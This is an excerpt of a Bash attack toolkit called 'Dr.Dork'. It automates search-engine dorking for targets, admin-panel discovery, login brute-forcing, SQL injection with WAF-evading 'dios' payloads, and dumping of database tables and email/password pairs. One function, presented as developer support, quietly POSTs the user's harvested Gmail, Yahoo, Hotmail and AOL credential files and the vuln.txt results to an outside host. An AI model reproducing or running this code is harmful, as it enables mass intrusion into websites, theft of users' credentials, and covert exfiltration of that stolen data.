...
▒${N}█▐${R}▒▒▒${N}████████████${R}▒▒▒▒       ${P}  Dr.Dork${R}
▒${N}▌▐${R}▒▒${N}██▄▀██████▀▄██${R}▒▒▒  ${N} ⊱⋅ ──────────── ⋅⊰⊱${N}⋅
${N}▐┼▐${R}▒▒${N}██▄▄▄▄██▄▄▄▄██${R}▒▒▒   ${BL}Author: ${BR}./Jenktaki${N} 
${N}▐┼▐${R}▒▒${N}██████████████${R}▒▒▒      ${P} Don't steal my code
${N}▐▄▐████─▀▐▐▀█─█─▌▐██▄${R}▒
▒▒${N}█████──────────▐███${R}▌ ${N}❏ ❐ ❑ ❒ ❏ ❐ ❏ ❐ ❑ ❒ ❏ ❐${R}
...
if [[ "$sukses" = "" ]];then
   echo -e "${N}Auto xploit failed try manual\n"
   source=$(echo "$ng" | grep -Po "post\('[^']*'|POST\('[^']*'|(<input).*?(>)|action=\"[^\"]*\"")
   source1=$(echo -e "$ng" | grep -Po 'name="[^"]*|value="[^"]*|action="[^"]*' | tr -d '"' | sed "s|name=|Nama_Parameter => |g" | sed "s|value=|isi => |g" | sed "s|action=|objective_post => |g")
   echo -e "${N}${P}$source\n\n${R}~ ${BL}keterangan\n${N}${O}${P}$source1${N}\n${N}${P}sample postdata: nama_parameter=@&nama_parameter=@&nama_parameter=isi\ngoal example post: $postnya/tujuan_post\n" | sed "s|//|/|g"
   echo -e "${R}~ ${N}clear for skip"
   echo -en "${G}try to postdata: ${BL}"
   read param1
   echo -en "${G}try to objective post method: ${BL}"
   read tujuan
   if [[ "$param1" = "" ]] || [[ "$objective" = "" ]];then
      echo -e "${P}Your selection is empty"
   else
   while read xploit
   do
    postdata=$(echo -e "$param1" | sed "s|@|$xploit|g")
    post=$(echo -e "$tujuan")
    echo -e "\n${O}try login with: ${B}$xploit${N}"
    echo -e "${P}objective post ke $post${N}"
      cek=$(curl -s -L -X POST "${post}" -d "${postdata}")
      if echo "$cek" | grep -Po "User|user|password|Password|Username|username|email|Email|wrong|Wrong|Fail|try|fail|wrong|Wrong|Invalid|Incorect|Try|try|Again|again|Error|405|error" >/dev/null
      then
         echo -e "${R}Failed to login with  : ${O}$xploit"
         echo -e "${P}Post data: $post -d "$postdata"${N}\n"
      else
         sukses="\n+++++++++++++++++++++!!![ login success ]!!!+++++++++++++++++++++\nSite: $target \nLogin: $xploit"
         echo -e "$sukses\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++" >> vuln.txt 
         echo -e "\a${N}[${G}INFO${N}] ${N}Login success\n${O}site : ${N}${P}$target\n${O}Login: ${BL}$xploit\n${N}${P}Saved: vuln-bypass.txt\n${R}${P}++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++${N}"
       break
   #echo -e "Post data: $post -d "$postdata""
      fi
    done < <(echo -e "$xpl\n$xpl1\n$xpl2\n$(cat $list_xploit 2>/dev/null)")
...
if [[ "$succes" = "" ]];then
   echo -e "${R}The site cannot be bypassed or poastdata error${N}"
fi
}
banner() {
  echo -e "
${G}█████████
${G}█▄█████▄█ 
${G}█▼▼▼▼▼     ${U}Author ${N}by ${R}jenk
${G}█          ${BL}pwnd ./manjiro shiki
${G}█▲▲▲▲▲     
${G}█████████
${G}__██____██___
...
[${O}6${N}]. logout"
echo -ne "[${R}?${N}] According to which ?? "
read n
case $n in
   1) clear
      banner
      echo -e "\033[1m$N[$R+$N] ${O}bypass login bruteforce"
      echo -en "\033[1m$N[$G!$N] input taget: "
      read target
      bypass
      read -p "back to menu y/n? " ask
      if [[ "$ask" = "y" ]];then
         menu
      fi
   ;;
   ...
   3) clear
      ...
      echo -e "[${O}3${N}]. back to menu"
      echo -ne "[${G}?${N}] According to which?? "
      read d
      case $d in
       1) 
          clear
      ...
      if [[ "$ask" = "y" ]];then
        ...
        2)
          clear
          banner
          echo -e "\033[1m$N[$R+$N] Auto bypass sql login from dorking mass"
          ...
          read -p "back to menu y/n? " tanya
      if [[ "$ask" = "y" ]];then
         menu
      fi
       ;;
         *) echo "[+] Thx for using this tools by jenk";;
         esac
   ;;
   4) clear
      banner
      echo "[+] Reverse ip + auto find admin + Auto xploit"
      echo "[1]. reverse ip normal"
      echo "[2]. reverse ip mass"
      echo "[3]. back to menu"
      echo -n "[?] According to which ?? "
      read d
      case $d in
      1) clear
         banner
         echo "[+] Reverse ip + auto find admin + Auto xploit"
         echo -n "[+] input site who want in reverse ip: "
         read site
      ...
      2) clear
         banner
         echo "[+] Reverse ip + auto find admin + Auto xploit mass"
         echo -n "[+] input list target: "
         read site
          while read site
           do 
             echo "[+] Ambil domain:$lightgreen $site"
   ...
   5) clear
      banner
      echo "[+] mouth admin finder"
      echo "[1]. Admin finder normal"
      echo "[2]. Admin finder mass"
      echo "[3]. back to menu"
      echo -n "[?] According to which ?? "
      read d
      case $d in
      1) clear
         ...
         echo -n "[+] input site : "
         read site
         echo -n "[+] input wordlist admin finder: "
         read wordlistadmin
         echo -n "[+] input worldlist bypass login: "
         read wordlist
      ...
      2) clear
         banner
         echo "[+] Hack the mass finder admin"
         echo -n "[+] input list site : "
         read login
         rm -rf Result_admin_finder.txt .live
...
banner3() {
  echo -e "    
         ...
         ░░░░░░░▄█▄▄▄█▄  /       ${N}|==┣▇▇▇▇▇▇═─-SQl-i${N}
         ▄▀░░░░▄▌─▄─▄─▐▄ ░░░▀▄   ${R}Warning${N} Don't steal code${N}
         █▄▄█░░▀▌─▀─▀─▐▀░░█▄▄█   ${O}./Jenk${O}3${O}n${N} 
         ░▐▌░░░░▀▀███▀▀░░░░▐▌
         ████░▄█████████▄░████
        "
...
echo -e "${N}[${G}*${N}]\033[2m Looking for login page by dorking${N}"
pa="1"
trap break INT
for dork in $dork_login+inurl:$site
do
   echo -e "${N}\033[2mloading.... $dork\nuse ctrl-c to skip to the next process\n${N}please wait make sure the connection is fast and stable..." | tr "+" " ";rm -rf .result_dork .not
    for COUNT in $(seq 1 $pa) 
       do
         echo -e "${G}Result from bing page $COUNT${N}"
         curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "http://www.bing.com/search?q=$dork&qs=n&pq=$dork&sc=8-5&sp=-1&sk=&first=$COUNT&FORM=PORE" | grep -Po '_blank" href="[^"]*' | sort -u | uniq -i | cut -d '"' -f3 | sed '/facebook/d' | sed '/google/d' | sed '/twitter/d' | sed '/microsoft/d' | sed '/youtube/d' | sed '/&amp/d' | sed "/amp;/d" >> .result_dork
...
echo -e "${N}\033[2mfind login page from result dork"
echo -e "${BL}use ctrl+c to skip to process furthermore\n${N}wait make sure the connection is fast and stable..."
trap break 2 INT
if cat .result_dork 2>/dev/null | sort -u | uniq -i | sed 's/\r$//' | tr -d "\0" | grep -a "$dir" >/dev/null
then
  for site3 in $(cat .result_dork 2>/dev/null | sort -u | uniq -i | sed 's/\r$//' | tr -d "\0" | grep -a "$dir")
  do
   ...
   echo -e "${N}[${R}!${N}] ${R}\033[2 Check the connection or there is no dorking result${N}"
fi
echo -e "${N}\033[2mfind login page use bruteforce site"
echo -e "${BL}use ctrl+c for skip ke prosess selanjut nya\n${N}please wait make sure the connection is fast and stable..."
trap break 3 INT
for admin in $(cat $panel_admin | sed 's/\r$//' | tr -d "\0")
  do
    ngecurl=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" -s -L --max-time $time_out "$site/$admin" -D - | tr -d '\0' | sed 's/\r$//')
...
trap - INT
if [[ -f .live ]];then
   echo -e "${N}${BL}collect the logs found"
   for F in `cat output/$dir/admin-login.txt 2>/dev/null | sort -u | uniq -i`;do echo -e "\x1b[0m${N}[${O}*${N}] ${G}FOUND ${N}:\033[2m $F";done
   echo -e "${N}[${R}+${N}] Done.....\n[${G}+${N}] Result login found saved ${G}output/$dir/admin-login.txt${N}"
   echo -e "[${G}+${N}] Result Total : ${G}\033[2m$(cat .live 2>/dev/null | wc -l) Login page${N}"
   echo -e "[${O}!${N}] Result Total : ${O}\033[2m$(cat .wp 2>/dev/null | wc -l) WordPress${N}"
   ...
   echo -e "${R}\033[2mMaaf failed to find page login what you're looking for\ntry changing the wordlist and mix it yourself"
fi
}
...
esql() {
  ...
  bla=$(diff -u .site .site2)
    if [[ "$bla" = "" ]]
    then
       echo -ne "not vuln\n${N}[${R}\033[7mCRITICAL${N}] ${R}\033[2mNOT FOUND failed search error page ${N}\n${N}[${R}*${N}] \033[2mmau force inject ?? y/n "
       read paksa
       if [[ "$force" = "y" ]]
       then
...
edump () {
  ...
  if cat .table | grep -aP "admin|login|user|user|code|pass" >/dev/null;then
     c=$(echo "Database :: $versi" | awk -F "${char}" '{print NF-1}' | sort -rn | uniq -i | head -1)
     coiadm=$(seq -s '=' $c | sed 's/[0-9]//g')
     echo -e "\033[1;35m Found login access table${N}"
     echo -en "${N}+$coiadm+\n${G}"
     cat .table | sort -u | uniq -i | grep -aP "admin|login|user|user|code|pass"
     echo -en "${N}+$coi+\n"
                 ...
                 then
                    ...
                    do 
                       ...
                       then
                          if [ -f .output ];then
                             echo -e "${N}+$coi+"
                             echo -n -e "${N}${G}1.${N} Dump ulit\n${N}${G}2.${N} back to database awal${N}${G}\n3.${N} return to menu"
                             if [[ "$masn" = "y" ]];then
                                echo -en "\n${BL}let empty then press ENTER skip to next site${N}"
                             fi
                             ...
                             *) echo -en "\n${O}skip to next site${N}";;
                             ...
                             echo -e "blank\n${N}+$coi+"
                             echo -e "${R}\033[2mF A I L E D try dump dios manual$N\n\033[2Make sure the input that is entered is correct or check the connection\nIf the input is correct, it is possible that the column you are going to is empty${N}"
                             echo -n -e "${N}${G}1.${N} Dump ulit\n${N}${G}2.${N} back to database awal${N}${G}\n3.${N} return to menu"
                             if [[ "$masn" = "y" ]];then
                                echo -en "\n${BL}let empty then press ENTER skip to next site${N}"
                             fi
...
then
   ...
   do 
      ...
      then
         ...
         echo -e "\n${R}$N[${R}\033[7;31mCRITICAL${N}]$O connection error: check again URL or server down$N" >&2
      fi
   done
   trap - INT
   ...
   then
      echo -e "${O}\033[2 Make sure the name entered is correct${N}"
      db_na=$(cat .db_er | grep -Po "$db_root" | sort -u | uniq -i)
      if [[ -z $dbdir ]];then
         db_dir="null"
      fi
      ...
      then
         dump_sqli="n"
         hex="database/**8**/()"
         echo -e "${O}\033[2immediately dios....${N}"
      else
         echo -e "${O}\033[2 Make sure the name entered is correct${N}"
         error
      fi
   fi
   echo -e "${N}\033[2mtekan ctrl+c 2x to skip to the next process${N}"
   echo -e "+$coi+\n Table Name::colomn name\n+$coi+$O"
   trap break 4 INT
   for pot in $(seq 50)
   do
     ...
     then
        ...
        then
           ...
           echo -e "${O}blank\n${N}+$coi+"
           echo -e "\033[2mdatabase which is aimed blank${N}"
           error
           break
        fi 
     else
...
echo -e "Nb: if you want to go straight to the results press CTRL + C / vol down + C"
...
gen() {
  echo -e "                |\033[7;32m Dork generator by Jenk ${N}|\n\n${O}cth: product cart buy${N}"
  echo -n "input Keyword: "
  read key
  echo -e "${O}cth: .php .html .aspx${N}"
  read -p "input Format : " mat
  echo -e "${O}how many dork do you want to produce max 800${N}"
...
read list
if [[ "$list" = "" ]];then
    echo -e "${P}File not found or empty${N}"
    hashmail
fi
...
echo -e "[+] Total  : $(cat .1-$list 2>/dev/null | wc -l) Empass Cracked"
echo -e "[+] Total  : $(cat .0-$list 2>/dev/null | wc -l) Empass Not Cracked"
echo -e "[*] Thx for using this tools by jenk:')"
         ...
         for b in $(echo "$b")
           do
             ...
             then
                ...
                then
                  sp="/-|"
                  #b = the dork result site and if the single dork site and dork dork are different
...
#single site calculation logic is not all dork
dorkscan() {
  true_lfi="n"
  dir=$(echo "$b" | sed 's!http[s]*://!!g' | cut -d '/' -f1)
  mkdir -p output/$dir
          ...
          if [[ "$boot_empas" = "y" ]];then
          	         ...
          	         do 
                          ...
                          do
                            ...
                            if [[ "$ump" = "r" ]]
                            then
                               echo -e "${N}[${O}INFO${N}] ${O}F A I L E D try dump dios manual$N\n\033[2m${BL}be sure input entered is correct or check connection\nIf the input is correct, it is possible that the column you are going to is empty${N}"
                               break
                            fi
                            if [[ "$based64" = "y" ]]
                            then
                            ...
                            echo -e "${R}${N}[${R}INFO${N}] ${R}FAILED subukan mo sa ibang dios pre${N}"
                       fi
                       done
                       trap break 4 INT
                   done
                    ...
                    then
                       ...
                       then
                          ...
                          do
                            ...
                            if [[ "$ump" = "r" ]]
                            then
                               echo -e "${N}[${O}INFO${N}] ${O}F A I L E D try dump dios manual$N\n\033[2mbe sure input already entered right or check connection\nIf the input is correct, it is possible that the column you are going to is empty${N}"
                               echo -n -e "${N}${G}1.${N} Dump ulit\n${N}${G}2.${N} back to database awal${N}${G}\n3.${N} return to menu"
                               if [[ "$masn" = "y" ]];then
                            ...
                            then
                               ...
                               3) menu
                               ;;
                               *) echo -e "${N}[${G}+${N}] Thx for using this tools by jenk";;
                               esac
                            else
                               echo -e "${N}Total Dumped :$G `wc -l output/$dir/dump-$table.txt`$N"
                               c=$(cat output/$dir/dump-$table.txt | awk -F "${char}" '{print NF-1}' | sort -rn | uniq -i | head -1)
...
sqli() {
  ...
  echo -ne "\x1b[0m${N}[${BL}`date +%T`${N}] try check vuln with commas "
  if [[ "$html" = "y" ]]
    then
    m11=$(echo $site | awk -F "/" '{print $(NF)}' | grep -o "[0-9]*" | head -1)
           if [[ "$m11" = "" ]]
            then
              ...
              param1=$(echo "$site" | sed "s/$m21/'$m21/g") #parameter number
              param11=$(echo "$param1" | cut -d "'" -f1)
              param21=$(echo "$param1" | cut -d "'" -f2)
            else
              param1=$(echo "$site" | sed "s/$m11/$m11'/g") #There isn't any number
              param11=$(echo "$param1" | cut -d "'" -f1)
              param21=$(echo "$param1" | cut -d "'" -f2)
            fi
    ...
    if [[ "$bla" = "" ]]
    then
       echo -ne "\anot vuln\n${N}[${R}\033[7mCRITICAL${N}] ${R}\033[2mNOT FOUND failed search error page ${N}\n${N}[${R}*${N}] ${R}\033[2m force inject ?? y/n "
       read paksa
       if [[ "$force" = "y" ]]
       then
...
info() {
  #echo -e "$by \n $waff"
   ...
   do
   if [[ "$us" = "oi" ]];then
      echo -e "${O}\033[2mFailed to fetch live db name dios${N}"
      lcvs="n"
      dump_sqli="n"
      dios
   else
   echo -e "$number" |  sed 's/kedjaw3n//g' | grep -a -o '[0-9]' > .number
   ...
   then
      ...
      then
        ...
        curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$ids" | grep -Po 'kedjaw3n[0-9]*' > .number
        cat .number |  sed 's/kedjaw3n//g' > .number
      fi
    if [[ "$based64" = "y" ]]
    then
    ...
    if [[ "$i" = `cat .number | sort -r` ]];then
       ...
       _in=$(cat .number | sort -r | sed '1 s/^.*$//' | sed "/^$/d" | head -1)
    fi
    if [[ "$based64" = "y" ]]
    then
       ...
       then
          ...
          echo -e "${O}Get db_name: ${N}\033[2m$posthis=null$dk"
       else
    ...
    if echo "$dbnya" | grep -Po "Forbidden|forbidden|Not Acceptable|Internal Server Error" >/dev/null;then
       echo -e "${O}\033[2mWAFF Blocked: ${R}`echo "$dbask" | grep -Po "Forbidden|forbidden|Not Acceptable|Internal Server Error" | head -1`${N}"
       continue
    fi
    echo "$dbask" > .db
    ff=$(cat .db)
            if [[ "$ff" = "" ]]
            then
              echo -e "${R}\033[2mFAILED take name db${N}"
            else
              ...
              then
                 ...
                 echo -en "${N}retrived_db: ${G}mysql@$dbdir/$db_na${N}~\n"
                 dump_sqli="y"
                 echo -e "${O}\03[2Make sure the name entered is correct${N}"
                 asx="$db_na"
                 hex=$(for ((ihex=0;ihex<${#asx};ihex++));do printf %02X \'${asx:$ihex:1};done)
                 hex=$(echo "0x$hex")
                 dios1="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=$hex)and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)"
   ...
   do
    ...
    then
       ...
       if echo "$info" | grep -Po "Database" >/dev/null;then
        ...
        echo -e "${N}[${R}INFO${N}] ${R}failed to take info server"
    fi
   fi
}
configurasi() {
	...
	curl -s "agressivcode.6te.net/config/edit.php?p=injected-$user" -X POST -d "newd=${bit2}" >/dev/null
	echo -n "."
	bit3=$(cat gmail.txt 2>/dev/null | sort -u | uniq -i | sort -u | uniq -i | sed "s/&/\&/g" )
	bit4=$(echo -e "Date: $date\n\n$bit3\n" | sort -u | uniq -i | sed "s/&/%26/g" )
	curl -s "agressivcode.6te.net/config/edit.php?p=gmail-$user" -X POST -d "newd=${bit4}" >/dev/null
	echo -n "."
	bit5=$(cat yahoo.txt 2>/dev/null | sort -u | uniq -i | sort -u | uniq -i | sed "s/&/\&/g" )
	bit6=$(echo -e "Date: $date\n\n$bit5\n" | sort -u | uniq -i | sed "s/&/%26/g" )
	curl -s "agressivcode.6te.net/config/edit.php?p=yahoo-$user" -X POST -d "newd=${bit6}" >/dev/null
	echo -n "."
	bit7=$(cat hotmail.txt 2>/dev/null | sort -u | uniq -i)
	bit8=$(echo -e "Date: $date\n\n$bit7\n" | sort -u | uniq -i | sed "s/&/%26/g" )
	echo -en "\033[2m\nwait a minute..."
	curl -s "agressivcode.6te.net/config/edit.php?p=hotmail-$user" -X POST -d "newd=${bit8}" >/dev/null
	echo -n "."
	bit9=$(cat aol.txt 2>/dev/null | sort -u | uniq -i | sort -u | uniq -i | sed "s/&/\&/g" )
	bit10=$(echo -e "Date: $date\n\n$bit9\n" | sort -u | uniq -i | sed "s/&/%26/g" )
	curl -s "agressivcode.6te.net/config/edit.php?p=aol-$user" -X POST -d "newd=${bit10}" >/dev/null
	echo -n "."
	bit11=$(cat vuln.txt 2>/dev/null | sort -u | uniq -i)
	bit12=$(echo -e "Date: $date\n\n$bit11\n" | sort -u | uniq -i | sed "s/&/%26/g" )
	curl -s "agressivcode.6te.net/config/edit.php?p=vuln-$user" -X POST -d "newd=${bit12}" >/dev/null
	echo -n "."
	echo -en "\033[2m\nsuccess!!\n"
}
dios() {
      ...
      for dio in $dios1 $dios2 $dios3 $dios4 $dios5 $dios6 $dios8 $dios9 u
        do
         ...
         then
            ...
            if [[ "$ff" = "" ]]
            then
              echo -e "${R}\033[2mFAILED subukan mo sa ibang dios pre${N}"
            else
              dump
              break
            fi
...
#====Dump dios normal==========================================================================================
     ...
     if [[ "$local" = "y" ]];then
       ...
       then
         ...
         if [[ "$ff" = "" ]]
         then
            echo -e "${R}${N}[${R}INFO${N}] ${R}FAILED try mo sa ibang dios pre${N}"
         else
            dump
            break
         fi
...
for i in $(seq $order_start $order_by)
  do
   ...
   if [ $? -eq 0 ]
         ...
         cek=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "$site%27${union}1,2,3--+" | tr -d '\0' | sed 's/\r$//')
          ...
          then
            ...
            then
               ...
               echo -e "\x1b[0m${N}[${BL}`date +%T`${N}] ${G}\033[2mWAF Bypased carry on  inject lagi${N}"
               union="$union"
               echo ".rdy" > .rdy
               break
            fi
    ...
    if echo "$running" | grep -Po "kedjaw3n3|kedjaw3n[0-9]*" > .angka
      then
      if echo "$colom" | grep -Po "," >/dev/null
       ...
       angka=$(cat .number | cut -d "." -f2 | tr "\n" "," )
       mkdir -p output/$dir
       echo -e -n "\a\n\x1b[0m${N}[${G}\033[2m`date +%T`${N}] order by what can ${i} colom"
       ...
       if [[ "$based64" = "y" ]]
         then
          ...
          echo -e "${O}the displayed number:$G $number$N\n" | sed 's/kedjaw3n//g'
       else
          if [[ "$html" = "y" ]]
          then
             ...
             if [[ "$postd" = "y" ]]
             then
                 echo -e "\nQuery $posthis=null$union$colom--+" | sed 's/0x6b65646a6177336e3//g' >> output/$dir/log_query.txt
                 echo -e "Query: $posthis=null$union$colom--+" | sed 's/0x6b65646a6177336e3//g' >> $injected_site
                 echo -e "Query: ${N}\033[2m$posthis=null$union$colom--+" | sed 's/0x6b65646a6177336e3//g'
                 echo -e "${O}the displayed number:$G $angka$N\n" | sed 's/kedjaw3n//g'
             else
...
tanong() {
  echo -e "\n${B}~ ${N}\033[2mgive support for developer so that tools this can develop lgi${N}"
...
msg${figure}
   ...
   configurasi
   echo -e "${R} salamat sayong supporta :)"
   sleep 2
   menu
}
menu() {
...
case $d in
 ...
 2) masn="y"
    ...
    echo -en "[${O}?${N}] input list taget: ${O}"
    read tar
    echo -e "${N}\033[2mLoad site from $tar `wc -l $tar 2>/dev/null | grep -ao "[0-9]*"` url\n"
    echo -e "${N}\033[2mgunakan ctrl+c saat order by to skip to the next site${N}"
    rm -rf .case1
    trap break INT
      ...
      case $d in
       1) masn="y"
        ...
        2) masn="y"
          ...
          trap - INT
          echo -e "${N}\033[2muse ctrl+c saat order by to skip to the next site${N}"
          trap break 2 INT
          masn="y"
          dump_name="n"
          for site in $(cat .vuln 2>/dev/null | sort | uniq -i | tr -d '\0' | sed 's/\r$//')
  ...
  4) based64="y"
     ...
     clear
     banner${sagot}
     echo -e "                |\033[7;32m BASE64 INJECTION ${N}|\n\n${G}\033[2mspecial for site berparameter base64"
  ...
  5) masn="n"
     ...
     clear
     banner${sagot}
     echo -e "                |\033[7;32m SQLI POST METHOD ${N}|\n\n${G}\033[2mspecial for site berparameter post"
     echo -en "${N}[${R}?${N}] site: ${O}"
     read site
   ...
   8) masn="y"
      ...
      echo -e "${N}\033[2gamitin ctrl+c saat order by to skip to the next site   his${N}"
      trap break 2 INT
      for site in $(cat .vuln 2>/dev/null | sort | uniq -i | tr -d '\0' | sed 's/\r$//')
         do
          waff="n"
   ...
   9) clear
      ...
      echo -e "[${G}3${N}]. return to the main menu"
      echo -ne "[${R}?${N}] According to which?? "
      read p
      case $p in
        1) clear
           banner${sagot}
           echo -e "                |\033[7;32m Query Email Pass dumper + auto filter mail ${N}|\n"
           read -p "masukan query sqli natapos na i dump email passs: " line
           line=$(echo "${line}" | sed "s/-- -/--+/g")
           email
           menu
           ;;
        2) clear
           banner${sagot}
           echo -e "                |\033[7;32m Query Email Pass dumper + auto filter mail ${N}|\n"
           read -p "masukan list file query sqli natapos na i dump email passs: " file
           ...
           echo -ne "[${R}?${N}] According to which?? "
             ...
             case $p in
              1) clear
                 ...
                 if [[ "$dec" = "" ]]
                 then
                   echo -e "${R}F A I L E D diko kaya to hash${N}"
                 else
                   echo "Result: $dec"
                 fi
   ...
   14) 
     ...
     echo -e "[${O}1${N}]. dorking biasa"
      echo -e "[${O}2${N}]. dorking mass"
      echo -e "[${O}3${N}]. return to main menu"
      echo -ne "[${R}?${N}] According to which ?? "
      read d
      case $d in
       1) masn="y"
          ...
          echo -e "[${O}!${N}] Result Total : ${R}\033[2m$(cat .not 2>/dev/null | wc -l) Site not vuln${N}"
          echo -e "[${R}!${N}] Result Total : ${BL}\033[2m$(cat .url 2>/dev/null | wc -l) Url parser${N}"
          echo -e "${N}\033[2mgunakan ctrl+c when order by to skip to the next site his${N}"          
          trap break 2 INT
          masn="y"
          dump_name="n"
          for site in $(cat .vuln 2>/dev/null | sort | uniq -i | tr -d '\0' | sed 's/\r$//')
        ...
        2) masn="y"
          ...
          trap - INT
          echo -e "${N}\033[2muse ctrl+c saat order by to skip to the next site his${N}"
          trap break 2 INT
          masn="y"
          dump_name="n"
          for site in $(cat .vuln 2>/dev/null | sort | uniq -i | tr -d '\0' | sed 's/\r$//')
